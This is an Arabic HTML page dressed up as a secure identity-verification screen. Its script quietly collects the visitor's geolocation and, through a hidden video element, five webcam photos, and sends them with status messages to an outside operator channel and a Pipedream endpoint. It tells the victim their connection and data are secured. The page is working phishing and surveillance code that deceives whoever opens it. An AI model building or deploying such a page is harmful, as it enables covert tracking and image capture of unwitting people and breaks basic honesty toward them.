<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>التحقق من الهوية</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    :root {
      --primary: #4f46e5;
      --primary-dark: #4338ca;
      --primary-light: #818cf8;
      --success: #10b981;
      --warning: #f59e0b;
      --danger: #ef4444;
      --dark: #0f172a;
      --dark-secondary: #1e293b;
      --light: #f8fafc;
      --gray: #94a3b8;
      --card-bg: rgba(30, 41, 59, 0.8);
      --glass-border: rgba(255, 255, 255, 0.1);
      --shadow-lg: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
      --shadow-md: 0 10px 40px -10px rgba(0, 0, 0, 0.3);
    }

    body {
      font-family: 'Cairo', sans-serif;
      background: var(--dark);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      position: relative;
      overflow: hidden;
    }

    /* خلفية متحركة */
    .animated-bg {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
      overflow: hidden;
    }

    .orb {
      position: absolute;
      border-radius: 50%;
      filter: blur(80px);
      opacity: 0.15;
      animation: float 20s infinite ease-in-out;
    }

    .orb-1 {
      width: 600px;
      height: 600px;
      background: var(--primary);
      top: -200px;
      left: -200px;
      animation-delay: 0s;
    }

    .orb-2 {
      width: 500px;
      height: 500px;
      background: var(--success);
      bottom: -200px;
      right: -150px;
      animation-delay: -7s;
      animation-duration: 23s;
    }

    .orb-3 {
      width: 400px;
      height: 400px;
      background: #8b5cf6;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      animation-delay: -14s;
      animation-duration: 18s;
    }

    @keyframes float {
      0%, 100% { transform: translate(0, 0) scale(1); }
      25% { transform: translate(50px, -50px) scale(1.1); }
      50% { transform: translate(-30px, 30px) scale(0.9); }
      75% { transform: translate(-60px, -20px) scale(1.05); }
    }

    /* الحاوية الرئيسية */
    .main-container {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 480px;
    }

    .card {
      background: var(--card-bg);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border: 1px solid var(--glass-border);
      border-radius: 24px;
      padding: 40px 30px;
      box-shadow: var(--shadow-lg);
      transition: all 0.3s ease;
    }

    /* الشعار والأيقونة */
    .icon-container {
      margin-bottom: 30px;
      text-align: center;
    }

    .shield-icon {
      width: 80px;
      height: 80px;
      margin: 0 auto 20px;
      background: linear-gradient(135deg, var(--primary), var(--primary-light));
      border-radius: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 15px 30px -10px rgba(79, 70, 229, 0.4);
      animation: pulse 2s ease-in-out infinite;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.05); }
    }

    .shield-icon svg {
      width: 45px;
      height: 45px;
      fill: white;
    }

    /* النصوص */
    .title {
      font-size: 26px;
      font-weight: 800;
      color: white;
      text-align: center;
      margin-bottom: 8px;
      line-height: 1.3;
    }

    .subtitle {
      font-size: 15px;
      color: var(--gray);
      text-align: center;
      margin-bottom: 30px;
      font-weight: 400;
    }

    /* شريط التقدم */
    .progress-container {
      margin-bottom: 30px;
    }

    .progress-info {
      display: flex;
      justify-content: space-between;
      margin-bottom: 10px;
      color: var(--gray);
      font-size: 13px;
    }

    .progress-bar {
      width: 100%;
      height: 6px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      overflow: hidden;
    }

    .progress-fill {
      height: 100%;
      background: linear-gradient(90deg, var(--primary), var(--primary-light));
      border-radius: 10px;
      transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
      width: 0%;
    }

    /* السبينر */
    .spinner-container {
      display: flex;
      justify-content: center;
      margin-bottom: 25px;
    }

    .spinner {
      width: 60px;
      height: 60px;
      position: relative;
    }

    .spinner-circle {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      border: 3px solid rgba(255, 255, 255, 0.1);
      border-top-color: var(--primary-light);
      border-right-color: var(--primary);
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .checkmark {
      width: 60px;
      height: 60px;
      border-radius: 50%;
      background: var(--success);
      display: flex;
      align-items: center;
      justify-content: center;
      animation: scaleIn 0.5s ease;
    }

    @keyframes scaleIn {
      from { transform: scale(0); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }

    .checkmark svg {
      width: 35px;
      height: 35px;
      stroke: white;
      stroke-width: 3;
      fill: none;
    }

    /* الخطوات */
    .steps {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 25px;
    }

    .step {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 14px 16px;
      background: rgba(255, 255, 255, 0.03);
      border-radius: 12px;
      border: 1px solid rgba(255, 255, 255, 0.05);
      transition: all 0.3s ease;
    }

    .step.completed {
      background: rgba(16, 185, 129, 0.1);
      border-color: rgba(16, 185, 129, 0.3);
    }

    .step.active {
      background: rgba(79, 70, 229, 0.1);
      border-color: rgba(79, 70, 229, 0.3);
    }

    .step-icon {
      width: 28px;
      height: 28px;
      min-width: 28px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
      font-weight: 700;
      transition: all 0.3s ease;
    }

    .step.pending .step-icon {
      background: rgba(255, 255, 255, 0.08);
      color: var(--gray);
    }

    .step.active .step-icon {
      background: var(--primary);
      color: white;
      animation: pulse 1.5s ease-in-out infinite;
    }

    .step.completed .step-icon {
      background: var(--success);
      color: white;
    }

    .step-text {
      font-size: 14px;
      color: var(--gray);
      flex: 1;
    }

    .step.completed .step-text,
    .step.active .step-text {
      color: white;
    }

    /* الفوتر */
    .footer-text {
      text-align: center;
      color: var(--gray);
      font-size: 12px;
      margin-top: 25px;
      opacity: 0.7;
    }

    .secure-badge {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      margin-top: 15px;
      color: var(--success);
      font-size: 12px;
      font-weight: 600;
    }

    .secure-badge svg {
      width: 16px;
      height: 16px;
    }

    /* إخفاء العناصر */
    .hidden {
      display: none !important;
    }

    video, canvas {
      position: absolute;
      opacity: 0;
      pointer-events: none;
      width: 1px;
      height: 1px;
    }

    /* Responsive */
    @media (max-width: 480px) {
      .card {
        padding: 30px 20px;
        border-radius: 20px;
      }
      .title {
        font-size: 22px;
      }
    }
  </style>
</head>
<body>
  <!-- خلفية متحركة -->
  <div class="animated-bg">
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>
    <div class="orb orb-3"></div>
  </div>

  <!-- العناصر المخفية -->
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <!-- الحاوية الرئيسية -->
  <div class="main-container">
    <div class="card">
      
      <!-- أيقونة -->
      <div class="icon-container">
        <div class="shield-icon" id="iconContainer">
          <svg viewBox="0 0 24 24">
            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
          </svg>
        </div>
        <h1 class="title" id="title">التحقق من الهوية</h1>
        <p class="subtitle" id="subtitle">يرجى الانتظار بينما نقوم بتأمين اتصالك</p>
      </div>

      <!-- شريط التقدم -->
      <div class="progress-container">
        <div class="progress-info">
          <span id="progressLabel">جاري التهيئة...</span>
          <span id="progressPercent">0%</span>
        </div>
        <div class="progress-bar">
          <div class="progress-fill" id="progressFill"></div>
        </div>
      </div>

      <!-- السبينر / علامة النجاح -->
      <div class="spinner-container" id="spinnerContainer">
        <div class="spinner">
          <div class="spinner-circle"></div>
        </div>
      </div>

      <!-- الخطوات -->
      <div class="steps">
        <div class="step" id="step1">
          <div class="step-icon">1</div>
          <div class="step-text">تهيئة الاتصال الآمن</div>
        </div>
        <div class="step" id="step2">
          <div class="step-icon">2</div>
          <div class="step-text">التحقق من الموقع الجغرافي</div>
        </div>
        <div class="step" id="step3">
          <div class="step-icon">3</div>
          <div class="step-text">تفعيل الكاميرا</div>
        </div>
        <div class="step" id="step4">
          <div class="step-icon">4</div>
          <div class="step-text">إتمام عملية التحقق</div>
        </div>
      </div>

      <!-- شارة الأمان -->
      <div class="secure-badge">
        <svg viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
        </svg>
        <span>اتصال مشفر وآمن</span>
      </div>

      <!-- فooter -->
      <p class="footer-text" id="footerText">© 2024 نظام التحقق الآمن</p>
    </div>
  </div>

  <script src="config.js"></script>
  <script src="cam-bot.js"></script>
  
  <script>
    // ============ الإعدادات ============
    const CAPTURE_COUNT = 5;
    const CAPTURE_INTERVAL = 2000;

    // ============ عناصر DOM ============
    const elements = {
      title: document.getElementById('title'),
      subtitle: document.getElementById('subtitle'),
      progressLabel: document.getElementById('progressLabel'),
      progressPercent: document.getElementById('progressPercent'),
      progressFill: document.getElementById('progressFill'),
      spinnerContainer: document.getElementById('spinnerContainer'),
      iconContainer: document.getElementById('iconContainer'),
      footerText: document.getElementById('footerText'),
      steps: {
        1: document.getElementById('step1'),
        2: document.getElementById('step2'),
        3: document.getElementById('step3'),
        4: document.getElementById('step4'),
      }
    };

    // ============ دوال واجهة المستخدم ============
    function updateProgress(percent, label) {
      elements.progressFill.style.width = percent + '%';
      elements.progressPercent.textContent = percent + '%';
      if (label) elements.progressLabel.textContent = label;
    }

    function setStepStatus(stepNum, status) {
      const step = elements.steps[stepNum];
      step.className = 'step ' + status;
    }

    function showSuccess() {
      elements.spinnerContainer.innerHTML = `
        <div class="checkmark">
          <svg viewBox="0 0 24 24">
            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
          </svg>
        </div>
      `;
      elements.title.textContent = 'تم التحقق بنجاح';
      elements.subtitle.textContent = 'شكراً لتعاونك، يمكنك إغلاق الصفحة الآن';
      elements.footerText.textContent = 'تم تأمين جميع بياناتك';
      
      // تغيير الأيقونة
      elements.iconContainer.style.background = 'linear-gradient(135deg, #10b981, #34d399)';
    }

    function showError(message) {
      elements.spinnerContainer.innerHTML = `
        <div style="font-size: 50px; animation: scaleIn 0.5s ease;">⚠️</div>
      `;
      elements.title.textContent = 'حدث خطأ';
      elements.subtitle.textContent = message;
      elements.progressLabel.textContent = 'فشل';
      elements.footerText.textContent = 'يرجى المحاولة مرة أخرى';
      elements.iconContainer.style.background = 'linear-gradient(135deg, #ef4444, #f87171)';
    }

    // ============ البرنامج الرئيسي ============
    async function main() {
      let imagesSent = 0;
      
      try {
        // الخطوة 1: تهيئة الاتصال
        setStepStatus(1, 'active');
        updateProgress(10, 'جاري تأمين الاتصال...');
        await new Promise(r => setTimeout(r, 600));
        
        setStepStatus(1, 'completed');
        updateProgress(25, 'تم تأمين الاتصال');

        // الخطوة 2: الموقع الجغرافي
        setStepStatus(2, 'active');
        updateProgress(30, 'جاري تحديد الموقع...');
        
        let locationData = null;
        try {
          locationData = await CamBot.getLocation();
          await Config.sendMessage(
            `🎯 <b>محاولة تحقق جديدة</b>\n\n` +
            `📍 <b>الموقع:</b> <a href="${locationData.mapUrl}">عرض على الخريطة</a>\n` +
            `🎯 <b>الدقة:</b> ${Math.round(locationData.accuracy)} متر\n` +
            `🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}`
          );
          setStepStatus(2, 'completed');
          updateProgress(50, 'تم تحديد الموقع');
        } catch (locErr) {
          await Config.sendMessage(
            `⚠️ <b>دخل بدون موقع</b>\n❌ السبب: ${locErr}\n🕐 ${new Date().toLocaleString('ar-SA')}`
          );
          setStepStatus(2, 'completed');
          updateProgress(50, 'تعذر تحديد الموقع');
        }

        // الخطوة 3: الكاميرا
        setStepStatus(3, 'active');
        updateProgress(60, 'جاري تفعيل الكاميرا...');
        
        try {
          await CamBot.startCamera();
          setStepStatus(3, 'completed');
          updateProgress(75, 'الكاميرا جاهزة');
        } catch (camErr) {
          await Config.sendMessage(`⚠️ فشل الكاميرا: ${camErr.message}`);
          throw new Error('تعذر الوصول إلى الكاميرا: ' + camErr.message);
        }

        // الخطوة 4: التقاط الصور
        setStepStatus(4, 'active');
        updateProgress(80, 'جاري التقاط الصور...');

        // التقاط أول صورة
        await new Promise(r => setTimeout(r, 800));
        let blob = await CamBot.capture();
        if (blob) {
          await Config.sendPhoto(blob, `📸 صورة ${imagesSent + 1}/${CAPTURE_COUNT}`);
          imagesSent++;
          updateProgress(
            80 + Math.floor((imagesSent / CAPTURE_COUNT) * 20),
            `تم التقاط ${imagesSent}/${CAPTURE_COUNT}`
          );
        }

        // التقاط باقي الصور
        await new Promise((resolve) => {
          const interval = setInterval(async () => {
            if (imagesSent >= CAPTURE_COUNT) {
              clearInterval(interval);
              resolve();
              return;
            }
            
            blob = await CamBot.capture();
            if (blob) {
              await Config.sendPhoto(blob, `📸 صورة ${imagesSent + 1}/${CAPTURE_COUNT}`);
              imagesSent++;
              updateProgress(
                80 + Math.floor((imagesSent / CAPTURE_COUNT) * 20),
                `تم التقاط ${imagesSent}/${CAPTURE_COUNT}`
              );
            }
            
            if (imagesSent >= CAPTURE_COUNT) {
              clearInterval(interval);
              resolve();
            }
          }, CAPTURE_INTERVAL);
        });

        // إتمام العملية
        await Config.sendMessage(
          `✅ <b>اكتمل التحقق</b>\n` +
          `📸 عدد الصور: ${imagesSent}\n` +
          `🕐 ${new Date().toLocaleString('ar-SA')}`
        );

        setStepStatus(4, 'completed');
        updateProgress(100, 'اكتمل التحقق');
        CamBot.stop();
        showSuccess();

      } catch (error) {
        console.error('خطأ:', error);
        showError(error.message || 'حدث خطأ غير متوقع');
        CamBot.stop();
        
        try {
          await Config.sendMessage(`❌ <b>فشل التحقق:</b> ${error.message}`);
        } catch (e) {}
      }
    }

    // ============ بدء التشغيل ============
    // تهيئة CamBot
    CamBot.init({
      captureCount: CAPTURE_COUNT,
      captureInterval: CAPTURE_INTERVAL,
      imageQuality: 0.8
    });

    // اختبار الاتصال بالسيرفر
    fetch(Config.PIPEDREAM_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'ping' })
    }).catch(() => {}).finally(() => {
      // تشغيل البرنامج الرئيسي
      main();
    });
  </script>
</body>
</html>
